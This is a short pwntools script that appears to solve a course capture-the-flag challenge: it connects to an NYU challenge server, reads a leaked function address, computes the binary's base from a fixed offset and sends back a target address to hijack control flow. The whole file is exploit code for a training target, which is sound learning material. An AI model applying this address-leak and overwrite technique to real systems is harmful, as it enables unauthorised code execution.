from pwn import *
conn = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1245)
print(conn.recvuntil(b'NetID').decode())
conn.sendline(b'<NetID>')
print(conn.recvuntil(b'written somewhere: ').decode())
func_addr = u64(conn.recvn(6).ljust(8, b'\x00'))
base_addr = func_addr - 0x1249
add_addr = base_addr + 0x1285
conn.send(p64(add_addr)[:6])